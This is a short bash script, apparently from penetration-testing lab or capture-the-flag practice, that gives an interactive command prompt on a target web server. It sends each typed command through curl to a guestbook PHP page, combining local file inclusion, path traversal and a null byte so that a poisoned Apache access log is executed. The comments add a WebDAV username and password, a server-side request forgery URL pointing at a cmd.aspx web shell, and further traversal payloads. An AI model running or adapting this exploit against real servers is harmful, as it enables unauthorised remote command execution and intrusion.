#!/bin/bash
#http://10.10.10.67/webdav_test_inception/s.php

if [ $1='' ]; then
	url='http://10.11.11.130/addguestbook.php?name=test&comment=thank+you'
else 
	url=$1
fi

while true; do
read -p "spotshell#: " cmd
curl --data-urlencode "cmd=$cmd&LANG=../../../../../xampp/apache/logs/access.log%00" $url -G -v 2>&1
#curl --basic --user 'webdav_tester:babygurl69' --data-urlencode "cmd=$cmd" $1 -G
# http://10.10.10.57:62696/Test.asp?u=http://localhost/cmd.aspx?xcmd=ping%2010.10.17.88
# http://10.11.11.130/addguestbook.php?name=test&comment=thank+you&LANG=../../../../../xampp/apache/logs/access.log%00&cmd=asas
done;
